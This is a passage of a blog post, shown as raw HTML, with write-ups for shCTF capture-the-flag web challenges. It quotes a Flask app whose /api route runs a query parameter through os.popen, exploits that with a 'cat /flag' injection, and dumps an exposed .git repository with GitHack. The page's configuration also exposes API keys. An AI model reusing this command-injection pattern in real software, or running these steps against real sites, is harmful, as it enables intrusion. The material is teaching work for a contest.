<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="kinsey"><meta name="copyright" content="kinsey"><meta name="generator" content="Hexo 7.2.0"><meta name="theme" content="hexo-theme-yun"><title>shCTF | åŒ—æ­Œ</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="stylesheet" type="text/css" href="https://fastly.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/katex.min.js"></script><link rel="stylesheet" type="text/css" href="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.css"><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/auto-render.min.js"></script><script type="module">import { renderKatex } from '/js/utils.js'
document.addEventListener("DOMContentLoaded", () => {
  renderKatex({
    ...{},
    ...undefined?.options,
  });
});</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"kinseyy.github.io","root":"/","title":"åŒ—æ²åŸæ­Œ","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"algolia":{"appID":"LWKPDLFKV6","apiKey":"6f230e5e2cdf36415bd02b48c1138c08","indexName":"my-hexo-blog","hits":{"per_page":8}},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://kinsey-six.vercel.app","comment":true,"visitor":true,"emoji":["https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/bilibili/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/weibo/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/qq/"],"locale":{"placeholder":"å¡«å†™é‚®ç®±ï¼Œå¯ä»¥æ”¶åˆ°å›å¤é€šçŸ¥å“¦ï½"},"requiredMeta":["nick"],"el":"#waline","lang":"en"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="åŒ—æ­Œ" type="application/atom+xml"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-1LL0D86CY9');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"S8MhECl1Bg6fZt5ulKgIlajS-MdYXbMMI","app_key":"eLIsYKPJFnSJdwmHLoigqBR4","server_url":"https://s8mhecl1.api.lncldglobal.com"}</script><script defer src="/js/analytics/leancloud-visitors.js" type="module"></script><meta name="description" content="WEB[Week1] 1zflaské¢˜ç›®æç¤ºrobots  é‚£æˆ‘ä»¬è®¿é—®&#x2F;robots.txtï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬è®¿é—®ï¼Œè‡ªåŠ¨ä¸‹è½½äº†ä¸€ä¸ªpyæ–‡ä»¶ 1234567891011121314151617181920212223import osimport flaskfrom flask import Flask, request, send_from_directory, send_file">
<meta property="og:type" content="article">
<meta property="og:title" content="shCTF">
<meta property="og:url" content="https://kinseyy.github.io/2024/10/05/shCTF/index.html">
<meta property="og:site_name" content="åŒ—æ­Œ">
<meta property="og:description" content="WEB[Week1] 1zflaské¢˜ç›®æç¤ºrobots  é‚£æˆ‘ä»¬è®¿é—®&#x2F;robots.txtï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬è®¿é—®ï¼Œè‡ªåŠ¨ä¸‹è½½äº†ä¸€ä¸ªpyæ–‡ä»¶ 1234567891011121314151617181920212223import osimport flaskfrom flask import Flask, request, send_from_directory, send_file">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051148888.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051548372.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051549207.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062001138.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062001115.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062049670.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062051642.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062052889.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062054069.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062113443.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062113507.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242055752.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242056773.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241908643.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241908783.png">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/7qW6h4Sfy6DXkO0QiaOzfHZg049wIQHicnMiaQLianWsb9jbTHXy0xsJjohqzl3dxT8xXZd00Fs4KQypQ0yWtJUt9Q/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=10005&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241934303.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241939435.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242020742.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242020845.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242022040.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242043580.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252033701.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252051517.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252054205.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252113737.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252126834.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252122634.png">
<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/87a906a53cfcc4947e39a76883a63591.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252128569.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252135483.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252142777.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271448305.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271528055.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271647524.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271648116.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271651197.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271654740.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271654308.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410312017171.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410312026817.png">
<meta property="article:published_time" content="2024-10-05T03:47:01.000Z">
<meta property="article:modified_time" content="2024-10-31T12:30:53.690Z">
<meta property="article:author" content="kinsey">
<meta property="article:tag" content="å¤ç°">
<meta property="article:tag" content="hashå¼ºç¢°æ’">
<meta property="article:tag" content="hashé•¿åº¦æ‰©å±•æ”»å‡»">
<meta property="article:tag" content="äºŒæ¬¡æ¸²æŸ“">
<meta property="article:tag" content="pickleååºåˆ—åŒ–">
<meta property="article:tag" content="YzmCMS v7.0æ¼æ´">
<meta property="article:tag" content="gitæºç æ³„éœ²">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051148888.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="kinsey"><img width="96" loading="lazy" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405312004243.jpeg" alt="kinsey"><span class="site-author-status" title="Looking for dawn.">ğŸŒ‘</span></a><div class="site-author-name"><a href="/about/">kinsey</a></div><span class="site-name">åŒ—æ­Œ</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">220</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">101</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ç•™è¨€æ¿"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/kinseyy" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=3954596483" title="ç½‘æ˜“äº‘éŸ³ä¹" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://travellings.link" title="Travelling" target="_blank" style="color:var(--hty-text-color)"><span class="icon iconify" data-icon="ri:train-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="å–œæ¬¢çš„å¥³å­©å­" style="color:hotpink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-1zflask"><span class="toc-number">1.1.</span> <span class="toc-text">[Week1] 1zflask</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-ez-gittt"><span class="toc-number">1.2.</span> <span class="toc-text">[Week1] ez_gittt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-%E5%8D%95%E8%BA%AB%E5%8D%81%E5%85%AB%E5%B9%B4%E7%9A%84%E6%89%8B%E9%80%9F"><span class="toc-number">1.3.</span> <span class="toc-text">[Week1] å•èº«åå…«å¹´çš„æ‰‹é€Ÿ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-%E8%9B%90%E8%9B%90-%E8%9B%90%E8%9B%90"><span class="toc-number">1.4.</span> <span class="toc-text">[Week1] è›è›?è›è›!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-poppopop"><span class="toc-number">1.5.</span> <span class="toc-text">[Week1] poppopop</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-MD5-Master"><span class="toc-number">1.6.</span> <span class="toc-text">[Week1] MD5 Master</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week2-%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81"><span class="toc-number">1.7.</span> <span class="toc-text">[Week2]ç™»å½•éªŒè¯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week2-dickle"><span class="toc-number">1.8.</span> <span class="toc-text">[Week2]dickle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week2-%E8%87%AA%E5%8A%A9%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.9.</span> <span class="toc-text">[Week2]è‡ªåŠ©æŸ¥è¯¢</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week2-MD5-GOD"><span class="toc-number">1.10.</span> <span class="toc-text">[Week2]MD5 GOD!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week3-%E5%B0%8F%E5%B0%8Fcms"><span class="toc-number">1.11.</span> <span class="toc-text">[Week3] å°å°cms</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.11.1.</span> <span class="toc-text">æ¼æ´å¤ç°</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week3-%E6%8B%9C%E5%B8%88%E4%B9%8B%E6%97%85%C2%B7%E7%95%AA%E5%A4%96"><span class="toc-number">1.12.</span> <span class="toc-text">[Week3] æ‹œå¸ˆä¹‹æ—…Â·ç•ªå¤–</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week3-love-flask"><span class="toc-number">1.13.</span> <span class="toc-text">[Week3] love_flask</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.13.1.</span> <span class="toc-text">ç¬¬äºŒç§æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week3-hacked-website"><span class="toc-number">1.14.</span> <span class="toc-text">[Week3] hacked_website</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="toc-number">1.14.1.</span> <span class="toc-text">è§£æ³•äºŒ</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week3-%E9%A1%B0"><span class="toc-number">1.15.</span> <span class="toc-text">[Week3] é¡°</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRYPTO"><span class="toc-number">2.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-EzAES"><span class="toc-number">2.1.</span> <span class="toc-text">[Week1] EzAES</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-baby-mod"><span class="toc-number">2.2.</span> <span class="toc-text">[Week1] baby_mod</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-d-known"><span class="toc-number">2.3.</span> <span class="toc-text">[Week1] d_known</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://kinseyy.github.io/2024/10/05/shCTF/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="kinsey"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="åŒ—æ­Œ"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">shCTF<a class="post-edit-link" href="https://github.com/kinseyy/kinseyy.github.io/tree/master/2024/05/31/hello-world_posts/shCTF.md" target="_blank" title="Edit this post" rel="noopener"><span class="icon iconify" data-icon="ri:edit-line"></span></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2024-10-05 11:47:01" itemprop="dateCreated datePublished" datetime="2024-10-05T11:47:01+08:00">2024-10-05</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2024-10-31 20:30:53" itemprop="dateModified" datetime="2024-10-31T20:30:53+08:00">2024-10-31</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">6.4k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">31m</span></span></span><span class="leancloud_visitors" id="/2024/10/05/shCTF/" data-flag-title="shCTF"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><span class="icon iconify" data-icon="ri:eye-line"></span> <span class="leancloud-visitors-count"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="Comments"><span class="icon iconify" data-icon="ri:chat-3-line"></span> <span class="waline-comment-count" id="/2024/10/05/shCTF/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">æ¯”èµ›å¤ç°</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E5%A4%8D%E7%8E%B0/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">å¤ç°</span></a><a class="tag-item" href="/tags/hash%E5%BC%BA%E7%A2%B0%E6%92%9E/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">hashå¼ºç¢°æ’</span></a><a class="tag-item" href="/tags/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">hashé•¿åº¦æ‰©å±•æ”»å‡»</span></a><a class="tag-item" href="/tags/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">äºŒæ¬¡æ¸²æŸ“</span></a><a class="tag-item" href="/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">pickleååºåˆ—åŒ–</span></a><a class="tag-item" href="/tags/YzmCMS-v7-0%E6%BC%8F%E6%B4%9E/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">YzmCMS v7.0æ¼æ´</span></a><a class="tag-item" href="/tags/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">gitæºç æ³„éœ²</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="Week1-1zflask"><a href="#Week1-1zflask" class="headerlink" title="[Week1] 1zflask"></a>[Week1] 1zflask</h4><p>é¢˜ç›®æç¤ºrobots</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051148888.png" alt="image-20241005114757812" loading="lazy"></p>
<p>é‚£æˆ‘ä»¬è®¿é—®&#x2F;robots.txtï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬è®¿é—®ï¼Œè‡ªåŠ¨ä¸‹è½½äº†ä¸€ä¸ªpyæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import flask</span><br><span class="line">from flask import Flask, request, send_from_directory, send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/api&#x27;)</span><br><span class="line">def api():</span><br><span class="line">    cmd = request.args.get(&#x27;SSHCTFF&#x27;, &#x27;ls /&#x27;)</span><br><span class="line">    result = os.popen(cmd).read()</span><br><span class="line">    return result</span><br><span class="line">    </span><br><span class="line">@app.route(&#x27;/robots.txt&#x27;)</span><br><span class="line">def static_from_root():</span><br><span class="line">    return send_from_directory(app.static_folder,&#x27;robots.txt&#x27;)</span><br><span class="line">    </span><br><span class="line">@app.route(&#x27;/s3recttt&#x27;)</span><br><span class="line">def get_source():</span><br><span class="line">    file_path = &quot;app.py&quot;</span><br><span class="line">    return send_file(file_path, as_attachment=True)</span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å‘ç°ï¼Œåœ¨apiè·¯ç”±é‡Œä¼ äº†ä¸€ä¸ªå‚æ•°ï¼Œä¸”é»˜è®¤ä¸ºls &#x2F;ï¼Œæˆ‘ä»¬è®¿é—®åœ¨è¿™ä¸ªè·¯ç”±</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051548372.png" alt="image-20241005154858274" loading="lazy"></p>
<p>æˆ‘ä»¬å‘ç°flagæ‰€åœ¨ä½ç½®ï¼Œä¿®æ”¹SSHCTFFä¸ºcat &#x2F;flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?SSHCTFF=cat /flag</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051549207.png" alt="image-20241005154942179" loading="lazy"></p>
<h4 id="Week1-ez-gittt"><a href="#Week1-ez-gittt" class="headerlink" title="[Week1] ez_gittt"></a>[Week1] ez_gittt</h4><p>æˆ‘ä»¬åœ¨ç½‘é¡µæºç é‡Œå‘ç°æç¤º</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062001138.png" alt="image-20241006200120091" loading="lazy"></p>
<p>æƒ³åˆ°äº†gitæ³„éœ²ï¼Œæˆ‘ä»¬è®¿é—®.git</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062001115.png" alt="image-20241006200149024" loading="lazy"></p>
<p>è¿›å…¥æ–‡ä»¶å¤¹</p>
<p>æˆ‘ä»¬åœ¨&#x2F;logs&#x2F;refs&#x2F;heads&#x2F;masteré‡Œå‘ç°ä¿®æ”¹æ—¥å¿—</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062049670.png" alt="image-20241006204926591" loading="lazy"></p>
<p>æˆ‘ä»¬å‘ç°ä»–æ·»åŠ äº†flagï¼Œåˆåˆ é™¤äº†flagï¼Œé‚£æˆ‘ä»¬å¯ä»¥å›æ»šæ—¥å¿—ï¼Œå°±èƒ½æ‰¾åˆ°flagäº†ï¼Œæˆ‘ä»¬å…ˆç”¨githackæŠŠä»“åº“å…‹éš†ä¸‹æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2  GitHack.py http://entry.shc.tf:30187/.git/  </span><br></pre></td></tr></table></figure>

<p>å…‹éš†ååœ¨æ–‡ä»¶ä¸­æŸ¥è¯¢æ—¥å¿—</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>

<p>ç„¶åå›æ»šæ—¥å¿—</p>
